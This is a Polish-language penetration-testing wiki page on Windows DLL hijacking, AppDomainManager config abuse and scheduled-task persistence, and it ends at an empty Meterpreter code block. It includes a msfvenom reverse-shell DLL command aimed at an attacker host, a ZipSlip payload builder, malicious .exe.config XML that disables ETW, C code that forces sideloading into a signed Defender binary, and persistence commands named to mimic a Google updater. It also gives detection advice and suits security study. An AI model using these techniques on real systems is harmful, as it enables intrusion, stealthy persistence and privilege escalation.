# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informacje podstawowe

DLL Hijacking polega na skłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu i zapewnienia trwałości, a rzadziej do eskalacji uprawnień. Mimo że tutaj skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Popularne techniki

W DLL hijackingu stosuje się kilka metod, a ich skuteczność zależy od sposobu, w jaki aplikacja ładuje biblioteki DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie oryginalnej biblioteki DLL złośliwą, opcjonalnie z użyciem DLL Proxying, aby zachować funkcjonalność oryginalnej biblioteki.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL w ścieżce wyszukiwania poprzedzającej ścieżkę do legalnej biblioteki, wykorzystując kolejność wyszukiwania stosowaną przez aplikację.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, sądząc, że jest to wymagana biblioteka, która nie istnieje.
4. **DLL Redirection**: Zmodyfikowanie parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby skierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie legalnej biblioteki DLL jej złośliwym odpowiednikiem w katalogu WinSxS — metodą często kojarzoną z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.

Aplikacja może również implementować **własny loader DLL**. Proces działający z podwyższonymi uprawnieniami może wyliczać pliki w katalogu podrzędnym, takim jak `Libraries` lub `Plugins`, a następnie przekazać wybraną bibliotekę DLL do procesu pomocniczego, niezależnie od standardowej kolejności wyszukiwania bibliotek DLL w Windows. Jeśli inne konto może tworzyć pliki w tym konkretnym katalogu, potraktuj to jako wskazówkę do dalszej analizy: sprawdź tożsamość procesu, efektywne ACL katalogu, regułę wyboru plików oraz to, czy istnieje osiągalna operacja ładowania. Możliwość zapisu w katalogu obok pliku wykonywalnego nie dowodzi, że proces ładuje z niego biblioteki DLL.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klasyczny DLL sideloading to nie jedyny sposób na skłonienie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **zarządzaną**, CLR sprawdza również **plik konfiguracyjny aplikacji** o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). Plik ten może definiować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego zestaw umieszczony obok pliku EXE, CLR załaduje go **przed standardową ścieżką wykonywania aplikacji** i uruchomi w zaufanym procesie.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft, oba elementy — `<appDomainManagerAssembly>` i `<appDomainManagerType>` — muszą być obecne, aby użyty został niestandardowy manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Minimalny menedżer:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Praktyczne uwagi:
- Ta technika dotyczy **wyłącznie .NET Framework**. Opiera się na parsowaniu konfiguracji CLR, a nie na kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **zarządzanym plikiem EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` albo sprawdzenie obecności **nagłówka CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`); zwykle znajduje się on **obok pliku EXE**.
- Przydaje się to w przypadku **podpisanych plików binarnych Microsoftu lub dostawców**, ponieważ zaufany plik EXE pozostaje nietknięty, a złośliwy zarządzany zestaw jest wykonywany w tym samym procesie.
- Jeśli masz już zapisywalny katalog instalatora lub aktualizacji, AppDomainManager hijacking może posłużyć jako **pierwszy etap**, po którym można użyć klasycznego DLL sideloading lub reflective loading w kolejnych etapach.

### AppDomainManager jako downloader i bootstrapper zaplanowanego zadania

Praktyczny schemat włamania polega na użyciu zaufanego pliku EXE .NET wraz ze złośliwym plikiem `*.config` i złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **niewielki bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia podpisany instalator lub aktualizator .NET z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Plik konfiguracyjny znajdujący się obok powoduje, że CLR ładuje zestaw atakującego **zanim rozpocznie się działanie legalnej aplikacji**.
3. Złośliwy manager wykonuje **kontrolę ścieżki** (na przykład kontynuuje tylko wtedy, gdy host EXE działa z katalogu `Downloads`, i pozwala uruchomić drugi etap wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli kontrola zakończy się pomyślnie, pobiera prawdziwy payload do ścieżki zapisywalnej przez użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i zapewnia trwałość za pomocą zaplanowanego zadania.

Dlaczego ten wariant jest istotny:
- Podpisany host EXE pozostaje niezmieniony, więc analiza, która sprawdza wyłącznie sumę kontrolną głównego pliku binarnego, może nie wykryć naruszenia.
- Prosta **analiza antyanalityczna oparta na ścieżce** jest powszechna: przeniesienie zestawu ZIP/EXE/DLL na Pulpit, do Temp lub do ścieżki sandboxa może celowo przerwać łańcuch.
- Biblioteka DLL AppDomainManager pierwszego etapu może być mała i generować niewiele śladów, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład zapewniania trwałości często spotykany w tym schemacie:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Tę technikę często lepiej klasyfikować jako **wykonywanie/persistence przez nadużycie konfiguracji .NET** niż jako klasyczny hijacking kolejności wyszukiwania brakującej biblioteki DLL, mimo że operatorzy często łączą obie techniki.

Punkty do wykrywania:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek rozpakowywania ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, z plikiem `<exe>.config` **w tym samym katalogu**.
- Nowe zaplanowane zadania, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują aktualizatory przeglądarek/dostawców.
- Krótkotrwałe procesy bootstrapujące zarządzane kodem, które natychmiast pobierają kolejny plik EXE, a następnie uruchamiają `schtasks.exe`.
- Próbki, które kończą działanie przedwcześnie, chyba że ścieżka pliku wykonywalnego odpowiada oczekiwanemu katalogowi profilu użytkownika.

### Przejęcie istniejącego zaplanowanego zadania w celu ponownego uruchomienia łańcucha sideloadingu

W przypadku persistence nie szukaj wyłącznie **tworzenia nowego zadania**. Niektóre grupy intruzów czekają, aż legalny instalator utworzy **standardowe zadanie aktualizatora**, a następnie **zmieniają akcję zadania**, tak aby istniejąca nazwa, autor i wyzwalacz nadal wyglądały znajomo dla obrońców.

Możliwy do ponownego wykorzystania przebieg:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj zadanie, które zwykle tworzy.
2. Wyeksportuj XML zadania i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, tak aby zadanie uruchamiało Twój **zaufany plik hosta EXE** z katalogu stagingowego zapisywalnego przez użytkownika, który następnie ładuje bocznie lub przez AppDomain właściwy payload.
4. Zarejestruj ponownie to samo zadanie zamiast tworzyć nowy, oczywisty artefakt persistence.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Dlaczego jest to bardziej stealthy:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jak nazwa aktualizatora dostawcy).
- Uruchamia je **usługa Harmonogramu zadań**, więc weryfikacja procesu nadrzędnego/przodków często wykrywa oczekiwany łańcuch uruchamiania przez harmonogram zamiast `explorer.exe`.
- Zespoły DFIR, które szukają tylko **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty kontrolne do wyszukiwania:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj pliki XML w `C:\Windows\System32\Tasks\*` oraz metadane w `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z wartością bazową.
- Generuj alert, gdy **zadanie aktualizatora wyglądające na pochodzące od dostawcy** uruchamia plik z **katalogu zapisywalnego przez użytkownika** lub uruchamia plik .NET EXE z plikiem `*.config` w tym samym katalogu.

> [!TIP]
> Aby zobaczyć łańcuch krok po kroku, który łączy przygotowanie HTML, konfiguracje AES-CTR i implanty .NET z DLL sideloadingiem, zapoznaj się z poniższym przebiegiem.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem na znalezienie brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **2 poniższych filtrów**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

a następnie wyświetlenie tylko **aktywności systemu plików**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **brakujących DLL ogólnie**, pozostaw to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, na przykład **"Process Name" "contains" `<exec name>`**, uruchom ten plik i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystywanie brakujących DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której możesz zapisywać. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym prawidłową DLL albo gdy żądana DLL nie istnieje, a Ty możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

**W** [**dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **znajdziesz szczegółowe informacje o sposobie ładowania DLL.**

**Aplikacje Windows** wyszukują DLL zgodnie z zestawem **z góry określonych ścieżek**, stosując określoną kolejność. Problem DLL hijacking pojawia się, gdy szkodliwa DLL zostanie strategicznie umieszczona w jednym z tych katalogów, dzięki czemu zostanie załadowana przed oryginalną DLL. Aby temu zapobiec, aplikacja powinna używać ścieżek bezwzględnych przy odwoływaniu się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego załadowano aplikację.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę do tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie ma funkcji, która zwracałaby ścieżkę do tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę do tego katalogu.
   1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Pamiętaj, że nie obejmuje to ścieżki dla danej aplikacji określonej w kluczu rejestru **App Paths**. Klucz **App Paths** nie jest używany przy ustalaniu ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Po wyłączeniu tej funkcji bieżący katalog przesuwa się na drugie miejsce. Aby ją wyłączyć, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpocznie się w katalogu modułu wykonywalnego, który **LoadLibraryEx** ładuje.

DLL można też załadować, podając ścieżkę bezwzględną zamiast nazwy. W takim przypadku Windows szuka samej DLL tylko we wskazanej lokalizacji; zależności wskazane nazwą nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj omawiać.

### Łączenie zapisu dowolnego pliku z hijackingiem brakującej DLL

**Powiązana technika:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny uruchamia się według **harmonogramu/przez usługę**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku skanera .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem właściwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Przygotuj payload DLL (np. reverse shell) z dowolnym eksportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli Twoim prymitywem jest **zapis dowolnego pliku w stylu ZipSlip**, przygotuj plik ZIP z wpisem wychodzącym poza katalog rozpakowywania, tak aby DLL trafiła do katalogu aplikacji:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Dostarcz archiwum do monitorowanego katalogu wejściowego/udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloadingu przez RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając kontrolowany przez atakującego katalog, można wymusić, aby proces docelowy, który rozwiązuje zaimportowaną bibliotekę DLL na podstawie nazwy (bez ścieżki bezwzględnej i bez użycia bezpiecznych flag ładowania), załadował złośliwą bibliotekę DLL z tego katalogu.

Główna idea
- Utwórz parametry procesu za pomocą RtlCreateProcessParametersEx i podaj własny DllPath wskazujący na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy plik binarny docelowego procesu będzie rozwiązywać nazwę biblioteki DLL, moduł ładujący uwzględni podany DllPath podczas wyszukiwania, umożliwiając niezawodny sideloading, nawet jeśli złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się to od SetDllDirectory, które wpływa wyłącznie na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub ładować ją za pomocą LoadLibrary na podstawie nazwy (bez ścieżki bezwzględnej i bez użycia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowanych na stałe ścieżek bezwzględnych nie można przejąć. Eksporty przekazywane dalej i SxS mogą zmienić kolejność wyszukiwania.

Minimalny przykład w C (ntdll, ciągi znaków wide, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie DLL sideloading przez RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Przykład użycia w praktyce
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub przekazujący wywołania do prawdziwej biblioteki) w katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, używając opisanej wyżej techniki. Loader rozwiązuje import za pomocą podanego DllPath i przeprowadza sideloading Twojej biblioteki DLL.

Zaobserwowano, że ta technika jest wykorzystywana w rzeczywistych atakach do uruchamiania wieloetapowych łańcuchów sideloadingu: początkowy launcher zapisuje pomocniczą bibliotekę DLL, która następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie biblioteki DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### AppDomainManager hijacking w .NET przez `.exe.config`

W przypadku celów **.NET Framework** sideloading można przeprowadzić **przed `Main()`** bez modyfikowania pamięci, wykorzystując sąsiadujący z aplikacją plik **`.exe.config`**. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik EXE .NET obok złośliwego pliku konfiguracyjnego i co najmniej jednego kontrolowanego przez siebie zestawu.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Uruchamia się host EXE, a **CLR odczytuje `<exe>.config`**.
2. Plik konfiguracyjny ustawia **`<appDomainManagerAssembly>`** i **`<appDomainManagerType>`**, aby środowisko uruchomieniowe utworzyło kontrolowany przez atakującego obiekt `AppDomainManager`.
3. Złośliwy manager uzyskuje możliwość wykonywania kodu **przed `Main()`** w zaufanym procesie hosta.
4. Ten sam plik konfiguracyjny może wymusić, aby CLR najpierw rozwiązywał lokalne zestawy (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację i telemetrię środowiska uruchomieniowego bez modyfikowania kodu inline.

Schemat typowy dla kampanii (dokładne zagnieżdżenie może się różnić w zależności od dyrektywy lub wersji CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Dlaczego jest to przydatne:
- **`<probing privatePath="."/>`** ogranicza rozwiązywanie assembly do katalogu aplikacji, zmieniając ten folder w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji z pełnym zaufaniem załadować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** zapewnia bardziej deterministyczny wybór środowiska uruchomieniowego.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza widoczność własnych zdarzeń ETW** za pomocą konfiguracji, zamiast gdy implant modyfikuje w pamięci `EtwEventWrite`.

Schemat operacyjny obserwowany w niedawnych kampaniach:
- Etap 1 zapisuje `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnie wyglądającego folderu **aktualizacji w AppData**, zmienia nazwę hosta na coś w rodzaju `update.exe` i uruchamia go ponownie za pomocą **zaplanowanego zadania**.
- Etap 3 weryfikuje kontekst wykonania (na przykład oczekiwany proces nadrzędny `svchost.exe` uruchomiony przez Task Scheduler) przed załadowaniem końcowego pliku DLL/eksportu RAT.

Wskazówki dotyczące wykrywania:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET** uruchomione z podejrzanymi plikami **`.config`** w pobliżu, w lokalizacjach z możliwością zapisu przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Zaplanowane zadania ponownie uruchamiające zmienione nazwy plików binarnych aktualizacji z **`%LOCALAPPDATA%`** lub katalogów aplikacji `\bin\update\`.
- Łańcuchy procesów nadrzędnych i podrzędnych, w których zaplanowane zadanie uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza katalogu dostawcy z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania DLL opisane w dokumentacji Windows

W dokumentacji Windows opisano pewne wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **plik DLL o tej samej nazwie co DLL już załadowany do pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza przekierowania i manifest, a następnie domyślnie wybiera DLL znajdujący się już w pamięci. **W takim przypadku system nie wyszukuje pliku DLL**.
- Jeśli DLL jest rozpoznawana jako **znana DLL** w bieżącej wersji Windows, system użyje jej wersji oraz wszelkich zależnych od niej plików DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych znanych plików DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie zależnych plików DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkową DLL zidentyfikowano za pomocą pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działał z **innymi uprawnieniami** (ruch poziomy lub lateral movement) i któremu **brakuje DLL**.
- Upewnij się, że masz **dostęp do zapisu** do dowolnego **katalogu**, w którym będzie **wyszukiwana DLL**. Może to być katalog pliku wykonywalnego lub katalog w ścieżce systemowej.

Te warunki rzadko występują domyślnie: w uprzywilejowanych plikach wykonywalnych zwykle nie brakuje zależnych DLL, a standardowi użytkownicy zazwyczaj nie mogą zapisywać w katalogach ze ścieżki wyszukiwania systemu. Błędna konfiguracja środowiska może jednak umożliwić spełnienie obu warunków.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Choć jego głównym celem jest obejście UAC, zawiera PoC dotyczące DLL hijacking dla określonych wersji Windows, które często można dostosować do znalezionego katalogu z prawem zapisu.

Pamiętaj, że możesz **sprawdzić uprawnienia do folderu**, wykonując:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

I **sprawdź uprawnienia do wszystkich folderów w PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Możesz także sprawdzić importy pliku wykonywalnego i eksporty biblioteki DLL za pomocą:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Aby uzyskać pełny przewodnik po tym, jak **wykorzystać DLL Hijacking do eskalacji uprawnień** przy uprawnieniach zapisu do **folderu w ścieżce systemowej PATH**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Narzędzia automatyczne

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia zapisu do dowolnego folderu w systemowej zmiennej PATH.\
Inne przydatne narzędzia automatyczne do wykrywania tej podatności to funkcje **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ i _Write-HijackDll._

### Przykład

Jeśli znajdziesz scenariusz podatny na wykorzystanie, jedną z najważniejszych rzeczy potrzebnych do skutecznego wykorzystania go będzie **utworzenie dll, która eksportuje co najmniej wszystkie funkcje importowane z niej przez plik wykonywalny**. Warto jednak zauważyć, że DLL Hijacking przydaje się do [**eskalacji z poziomu Medium Integrity do High (z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z [**High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia prawidłowej dll** znajdziesz w tym opracowaniu dotyczącym DLL Hijacking w celu wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcji** znajdziesz kilka **podstawowych kodów dll**, które mogą przydać się jako **szablony** lub do utworzenia **dll eksportującej niewymagane funkcje**.

## **Tworzenie i kompilowanie DLL**

### **Proxyfikowanie DLL**

Zasadniczo **DLL proxy** to biblioteka DLL zdolna do **wykonania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** funkcji i **działania** zgodnie z **oczekiwaniami** przez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz **wskazać plik wykonywalny i wybrać bibliotekę**, którą chcesz poddać proxyfikowaniu, a następnie **wygenerować proxyfikowaną dll** albo **wskazać DLL** i **wygenerować proxyfikowaną dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**

```bash
